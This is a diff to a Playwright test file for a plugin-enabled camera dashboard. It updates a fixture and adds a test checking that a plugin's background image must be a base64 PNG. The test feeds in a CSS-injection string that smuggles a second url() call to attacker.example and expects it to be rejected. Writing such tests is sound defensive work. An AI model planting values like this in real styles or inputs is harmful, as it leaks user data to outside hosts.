@@ -192,11 +192,11 @@ async function dashboardWithPlugin(
           cameras: [
             {
               id: "c1", name: "Workshop", source: { kind: "rtsp", url: "rtsp://camera" }, printer_id: null,
-              max_fps: 30, brightness: 1, contrast: 1, sharpness: 0, crop: null, rotation: 0,
+              max_fps: 30, detect_fps: 60, brightness: 1, contrast: 1, sharpness: 0, crop: null, rotation: 0,
               target_fps: 30, achieved_fps: 29.8, inferring: false, in_use: true, online: true, standby: false, last_result: null,
             },
           ],
-          printers: [], prints: [], monitors: [monitor], tokens: [], integrations: [], notifiers: [],
+          printers: [], prints: [], reviews: [], monitors: [monitor], tokens: [], integrations: [], notifiers: [],
           settings: { notifiers: {}, update_check: true, theme: "dark", themes: [], layout: {} },
           stats: { inference_device: "CPU", infer_ms: 1, capacity_fps: 1 },
           plugins: [{ ...plugin, manifest: { ...plugin.manifest, surfaces, events: ["result"] }, granted, files: ["plugin.js"] }],
@@ -410,7 +410,7 @@ test("glass takes the text colour its tone can carry", async ({ page }) => {
     });
   const wear = (opacity: number, tone: number) =>
     page.evaluate(async (glass) => {
-      const { applyTheme } = await import("/src/theme.ts");
+      const { applyTheme } = await import("/src/theme.ts" as string);
       applyTheme("glass", [], glass);
     }, { opacity, tone });
 
@@ -450,4 +450,19 @@ test("a float node in a panel floats without a round trip to the sandbox", async
 
   expect(await page.evaluate(() => (window as any).__sent.filter((c: any) => c.cmd === "plugin.act").length)).toBe(0);
   expect(await page.evaluate(() => (window as any).__floated)).toBe(1);
+});
+
+test("a background is only ever a base64 picture, so it cannot smuggle a second address", async ({ page }) => {
+  await dashboardWithPlugin(page, PIP, ["background"]);
+  const picture = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
+  const paint = (image: string) =>
+    page.evaluate((image) => {
+      const win = window as any;
+      win.__pgEvent({ event: "plugin_effect", id: "pip", effect: { kind: "background", image } });
+      return win.__pg.getState().background?.image ?? null;
+    }, image);
+
+  expect(await paint(picture)).toBe(picture);
+  expect(await paint('data:image/png;base64,AAAA"), url("https://attacker.example/?d=1')).toBeNull();
+  expect(await paint("data:image/svg+xml;base64,PHN2Zy8+")).toBeNull();
 });
